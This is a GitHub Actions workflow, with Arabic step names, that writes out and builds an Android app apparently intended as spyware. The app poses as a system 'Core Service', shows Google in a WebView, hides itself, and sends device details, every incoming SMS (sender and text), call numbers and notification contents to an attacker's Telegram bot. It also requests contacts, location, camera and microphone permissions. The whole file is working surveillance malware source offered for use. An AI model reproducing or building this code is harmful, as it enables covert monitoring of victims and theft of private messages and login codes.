name: HUSSEIN V8 ULTIMATE - الحل النهائي
on:
  workflow_dispatch:
    inputs:
      bot_token:
        required: true
      chat_id:
        required: true

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: إعداد Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: إعداد Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.4'

      - name: إنشاء هيكل المشروع
        run: |
          mkdir -p app/src/main/java/com/h/core
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml
          echo "include ':app'" > settings.gradle

      - name: إنشاء ملفات Gradle
        run: |
          # build.gradle الرئيسي
          cat << 'EOF' > build.gradle
          buildscript {
              ext.kotlin_version = '1.9.0'
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.0'
              }
          }

          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }

          tasks.register('clean', Delete) {
              delete rootProject.buildDir
          }
          EOF

          # app/build.gradle
          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.h.core'
              compileSdk 34

              defaultConfig {
                  applicationId "com.android.core.service"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
              implementation 'androidx.core:core:1.12.0'
          }
          EOF

      - name: إنشاء ملفات التطبيق
        run: |
          # AndroidManifest.xml
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              
              <application android:label="Core Service" android:icon="@android:drawable/sym_def_app_icon" android:theme="@android:style/Theme.DeviceDefault" android:allowBackup="false">
                  <activity android:name=".MainActivity" android:exported="true" android:excludeFromRecents="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".CoreService" android:exported="false" android:foregroundServiceType="camera" />
                  <service android:name=".NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
                  </service>
                  <receiver android:name=".SmsReceiver" android:exported="true">
                      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
                  </receiver>
                  <receiver android:name=".CallReceiver" android:exported="true">
                      <intent-filter><action android:name="android.intent.action.PHONE_STATE" /></intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          # Config.java
          cat << 'EOF' > app/src/main/java/com/h/core/Config.java
          package com.h.core;
          public class Config {
              public static final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
              public static final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
          }
          EOF

          # Telegram.java (مبسط)
          cat << 'EOF' > app/src/main/java/com/h/core/Telegram.java
          package com.h.core;
          import android.content.Context;
          import okhttp3.*;
          import java.io.IOException;
          public class Telegram {
              public static void sendMessage(Context ctx, String text) {
                  try {
                      OkHttpClient client = new OkHttpClient();
                      RequestBody body = new FormBody.Builder().add("chat_id", Config.CHAT_ID).add("text", text).add("parse_mode", "HTML").build();
                      Request req = new Request.Builder().url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage").post(body).build();
                      client.newCall(req).enqueue(new okhttp3.Callback() {
                          public void onFailure(okhttp3.Call call, IOException e) {}
                          public void onResponse(okhttp3.Call call, Response res) throws IOException { res.close(); }
                      });
                  } catch(Exception e){}
              }
          }
          EOF

          # CoreService.java
          cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
          package com.h.core;
          import android.app.*;
          import android.content.*;
          import android.os.*;
          import android.telephony.TelephonyManager;
          import android.location.Location;
          import android.location.LocationManager;
          import android.provider.*;
          import java.io.*;
          public class CoreService extends Service {
              @Override public void onCreate() {
                  super.onCreate();
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel ch = new NotificationChannel("core", "Core", NotificationManager.IMPORTANCE_LOW);
                      ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
                      startForeground(1001, new Notification.Builder(this, "core").setContentTitle("نشط").setSmallIcon(android.R.drawable.stat_sys_download).build());
                  }
                  Telegram.sendMessage(this, "✅ جهاز جديد\n" + Build.MANUFACTURER + " " + Build.MODEL);
              }
              @Override public IBinder onBind(Intent i) { return null; }
          }
          EOF

          # MainActivity.java
          cat << 'EOF' > app/src/main/java/com/h/core/MainActivity.java
          package com.h.core;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.webkit.WebView;
          public class MainActivity extends Activity {
              @Override protected void onCreate(Bundle b) {
                  super.onCreate(b);
                  WebView w = new WebView(this); w.loadUrl("https://www.google.com"); setContentView(w);
                  startService(new Intent(this, CoreService.class));
                  new android.os.Handler().postDelayed(() -> moveTaskToBack(true), 2000);
              }
          }
          EOF

          # SmsReceiver.java
          cat << 'EOF' > app/src/main/java/com/h/core/SmsReceiver.java
          package com.h.core;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.SmsMessage;
          public class SmsReceiver extends BroadcastReceiver {
              @Override public void onReceive(Context ctx, Intent i) {
                  Object[] pdus = (Object[]) i.getExtras().get("pdus");
                  for(Object pdu: pdus) { 
                      SmsMessage sms = SmsMessage.createFromPdu((byte[])pdu);
                      Telegram.sendMessage(ctx, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
                  }
              }
          }
          EOF

          # CallReceiver.java
          cat << 'EOF' > app/src/main/java/com/h/core/CallReceiver.java
          package com.h.core;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.TelephonyManager;
          public class CallReceiver extends BroadcastReceiver {
              @Override public void onReceive(Context ctx, Intent i) {
                  String state = i.getStringExtra(TelephonyManager.EXTRA_STATE);
                  String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                  if(num!=null && state!=null) {
                      Telegram.sendMessage(ctx, "📞 مكالمة " + state + "\n" + num);
                  }
              }
          }
          EOF

          # NotificationListener.java
          cat << 'EOF' > app/src/main/java/com/h/core/NotificationListener.java
          package com.h.core;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          public class NotificationListener extends NotificationListenerService {
              @Override public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle ex = sbn.getNotification().extras;
                  String title = ex.getString("android.title","");
                  String text = ex.getString("android.text","");
                  Telegram.sendMessage(this, "🔔 " + title + "\n" + text);
              }
          }
          EOF

          # proguard-rules.pro
          cat << 'EOF' > app/proguard-rules.pro
          -keep class com.h.core.** { *; }
          -keep class okhttp3.** { *; }
          -dontwarn okhttp3.**
          EOF

      - name: منح الصلاحيات وتنظيف
        run: chmod +x gradlew || true

      - name: بناء APK
        run: ./gradlew assembleRelease --stacktrace

      - name: رفع APK
        uses: actions/upload-artifact@v4
        with:
          name: HUSSEIN-V8-APK
          path: app/build/outputs/apk/release/*.apk
